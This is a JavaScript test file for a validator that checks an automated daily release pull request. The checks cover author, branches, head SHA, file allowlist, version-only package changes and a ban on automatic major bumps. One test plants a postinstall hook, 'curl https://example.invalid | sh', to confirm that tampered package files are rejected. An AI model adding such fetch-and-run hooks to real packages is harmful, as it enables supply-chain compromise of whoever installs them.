import assert from 'node:assert/strict'
import test from 'node:test'

import { validateDailyReleasePullRequest } from './validate-daily-release-pr.mjs'

const headSha = 'abc123'
const expectedReleasePlan = {
  backend: {
    action: 'bump',
    currentVersion: '0.19.17',
    nextVersion: '0.20.0',
    releaseType: 'minor',
  },
  desktop: {
    action: 'bump',
    currentVersion: '0.18.8',
    nextVersion: '0.19.0',
    releaseType: 'minor',
  },
  ios: {
    action: 'none',
    currentVersion: '0.1.0',
    nextVersion: '0.1.0',
    releaseType: '',
  },
}

const packageFiles = {
  backend: 'apps/backend/package.json',
  desktop: 'apps/desktop/package.json',
  ios: 'apps/ios/package.json',
}

function packageContentsForPlan(plan) {
  return Object.fromEntries(
    Object.entries(plan)
      .filter(([, component]) => component.action === 'bump')
      .map(([name, component]) => [
        packageFiles[name],
        {
          base: {
            name: `@nuphos/${name}`,
            private: true,
            version: component.currentVersion,
          },
          head: {
            name: `@nuphos/${name}`,
            private: true,
            version: component.nextVersion,
          },
        },
      ]),
  )
}

function validationOptions(overrides = {}) {
  const plan = overrides.expectedReleasePlan ?? expectedReleasePlan

  return {
    expectedHeadSha: headSha,
    expectedReleasePlan: plan,
    headParentIsMainAncestor: true,
    packageContents: packageContentsForPlan(plan),
    ...overrides,
  }
}

function releasePullRequest(overrides = {}) {
  return {
    author: { login: 'app/nuphos-release-automation' },
    baseRefName: 'main',
    files: [{ path: 'apps/backend/package.json' }, { path: 'apps/desktop/package.json' }],
    headRefName: 'automation/daily-release',
    headRefOid: headSha,
    state: 'OPEN',
    title: 'release: backend v0.20.0 + desktop v0.19.0',
    ...overrides,
  }
}

test('accepts the generated release PR contract', () => {
  const result = validateDailyReleasePullRequest(releasePullRequest(), validationOptions())

  assert.deepEqual(result.files, ['apps/backend/package.json', 'apps/desktop/package.json'])
})

test('accepts a three-component release', () => {
  const plan = {
    ...expectedReleasePlan,
    ios: { action: 'bump', currentVersion: '0.1.0', nextVersion: '0.1.1', releaseType: 'patch' },
  }
  const result = validateDailyReleasePullRequest(
    releasePullRequest({
      files: [
        { path: 'apps/backend/package.json' },
        { path: 'apps/desktop/package.json' },
        { path: 'apps/ios/package.json' },
      ],
      title: 'release: backend v0.20.0 + desktop v0.19.0 + ios v0.1.1',
    }),
    validationOptions({ expectedReleasePlan: plan }),
  )

  assert.deepEqual(result.files, [
    'apps/backend/package.json',
    'apps/desktop/package.json',
    'apps/ios/package.json',
  ])
})

test('accepts a single-component release', () => {
  const backendOnlyPlan = {
    backend: {
      action: 'bump',
      currentVersion: '0.20.0',
      nextVersion: '0.20.1',
      releaseType: 'patch',
    },
    desktop: {
      action: 'none',
      currentVersion: '0.19.0',
      nextVersion: '0.19.0',
      releaseType: '',
    },
    ios: {
      action: 'none',
      currentVersion: '0.1.0',
      nextVersion: '0.1.0',
      releaseType: '',
    },
  }
  const result = validateDailyReleasePullRequest(
    releasePullRequest({
      files: [{ path: 'apps/backend/package.json' }],
      title: 'release: backend v0.20.1',
    }),
    validationOptions({ expectedReleasePlan: backendOnlyPlan }),
  )

  assert.deepEqual(result.files, ['apps/backend/package.json'])
})

test('accepts a release-current component alongside the planned bump', () => {
  const result = validateDailyReleasePullRequest(
    releasePullRequest({
      files: [{ path: 'apps/backend/package.json' }],
      title: 'release: backend v0.20.1',
    }),
    validationOptions({
      expectedReleasePlan: {
        backend: {
          action: 'bump',
          currentVersion: '0.20.0',
          nextVersion: '0.20.1',
          releaseType: 'patch',
        },
        desktop: {
          action: 'release-current',
          currentVersion: '0.19.0',
          nextVersion: '0.19.0',
          releaseType: '',
        },
        ios: {
          action: 'none',
          currentVersion: '0.1.0',
          nextVersion: '0.1.0',
          releaseType: '',
        },
      },
    }),
  )

  assert.deepEqual(result.files, ['apps/backend/package.json'])
})

test('rejects a non-app author', () => {
  assert.throws(
    () =>
      validateDailyReleasePullRequest(
        releasePullRequest({ author: { login: 'maintainer' } }),
        validationOptions(),
      ),
    /unexpected author/,
  )
})

test('rejects an unexpected branch or base', () => {
  assert.throws(
    () =>
      validateDailyReleasePullRequest(
        releasePullRequest({
          baseRefName: 'production',
          headRefName: 'feature/not-a-release',
        }),
        validationOptions(),
      ),
    /unexpected base[\s\S]*unexpected head/,
  )
})

test('rejects a changed head', () => {
  assert.throws(
    () =>
      validateDailyReleasePullRequest(releasePullRequest(), {
        ...validationOptions(),
        expectedHeadSha: 'old456',
      }),
    /head changed/,
  )
})

test('rejects a release commit whose parent is not on main', () => {
  assert.throws(
    () =>
      validateDailyReleasePullRequest(
        releasePullRequest(),
        validationOptions({ headParentIsMainAncestor: false }),
      ),
    /release commit parent is not an ancestor of main/,
  )
})

test('rejects any file outside the version allowlist', () => {
  assert.throws(
    () =>
      validateDailyReleasePullRequest(
        releasePullRequest({
          files: [{ path: 'apps/backend/package.json' }, { path: 'apps/backend/src/index.ts' }],
          title: 'release: backend v0.20.1',
        }),
        validationOptions({
          expectedReleasePlan: {
            ...expectedReleasePlan,
            desktop: {
              action: 'none',
              currentVersion: '0.18.8',
              nextVersion: '0.18.8',
              releaseType: '',
            },
            ios: {
              action: 'none',
              currentVersion: '0.1.0',
              nextVersion: '0.1.0',
              releaseType: '',
            },
          },
        }),
      ),
    /unexpected files: apps\/backend\/src\/index\.ts/,
  )
})

test('rejects package changes outside the top-level version field', () => {
  const packageContents = packageContentsForPlan(expectedReleasePlan)

  packageContents['apps/backend/package.json'].head.scripts = {
    postinstall: 'curl https://example.invalid | sh',
  }

  assert.throws(
    () =>
      validateDailyReleasePullRequest(releasePullRequest(), validationOptions({ packageContents })),
    /apps\/backend\/package\.json changes fields other than the top-level version/,
  )
})

test('rejects package contents that do not contain the planned next version', () => {
  const packageContents = packageContentsForPlan(expectedReleasePlan)

  packageContents['apps/desktop/package.json'].head.version = '0.19.1'

  assert.throws(
    () =>
      validateDailyReleasePullRequest(releasePullRequest(), validationOptions({ packageContents })),
    /head version "0\.19\.1" does not match planned next version "0\.19\.0"/,
  )
})

test('rejects missing package contents', () => {
  assert.throws(
    () =>
      validateDailyReleasePullRequest(
        releasePullRequest(),
        validationOptions({ packageContents: {} }),
      ),
    /apps\/backend\/package\.json base contents is missing/,
  )
})

test('rejects a non-release title', () => {
  assert.throws(
    () =>
      validateDailyReleasePullRequest(
        releasePullRequest({ title: 'fix: bypass review' }),
        validationOptions(),
      ),
    /unexpected title/,
  )
})

test('rejects a component and title that do not match the release plan', () => {
  assert.throws(
    () =>
      validateDailyReleasePullRequest(
        releasePullRequest({
          files: [{ path: 'apps/backend/package.json' }],
          title: 'release: backend v1.0.0',
        }),
        validationOptions({
          expectedReleasePlan: {
            backend: {
              action: 'none',
              currentVersion: '0.20.0',
              nextVersion: '0.20.0',
              releaseType: '',
            },
            desktop: {
              action: 'bump',
              currentVersion: '0.19.0',
              nextVersion: '0.19.1',
              releaseType: 'patch',
            },
            ios: {
              action: 'none',
              currentVersion: '0.1.0',
              nextVersion: '0.1.0',
              releaseType: '',
            },
          },
        }),
      ),
    /unexpected title[\s\S]*release files do not match plan/,
  )
})

test('rejects an automatic Major version bump even when title and files match', () => {
  assert.throws(
    () =>
      validateDailyReleasePullRequest(
        releasePullRequest({
          files: [{ path: 'apps/backend/package.json' }],
          title: 'release: backend v1.0.0',
        }),
        validationOptions({
          expectedReleasePlan: {
            backend: {
              action: 'bump',
              currentVersion: '0.20.1',
              nextVersion: '1.0.0',
              releaseType: 'minor',
            },
            desktop: {
              action: 'none',
              currentVersion: '0.19.0',
              nextVersion: '0.19.0',
              releaseType: '',
            },
            ios: {
              action: 'none',
              currentVersion: '0.1.0',
              nextVersion: '0.1.0',
              releaseType: '',
            },
          },
        }),
      ),
    /automated major bump 0\.20\.1 -> 1\.0\.0 is forbidden/,
  )
})

test('rejects an unsupported component action', () => {
  assert.throws(
    () =>
      validateDailyReleasePullRequest(
        releasePullRequest({
          files: [{ path: 'apps/backend/package.json' }],
          title: 'release: backend v0.20.0',
        }),
        validationOptions({
          expectedReleasePlan: {
            backend: expectedReleasePlan.backend,
            desktop: {
              ...expectedReleasePlan.desktop,
              action: 'bumpp',
            },
            ios: {
              action: 'none',
              currentVersion: '0.1.0',
              nextVersion: '0.1.0',
              releaseType: '',
            },
          },
        }),
      ),
    /desktop has unsupported release action "bumpp"/,
  )
})
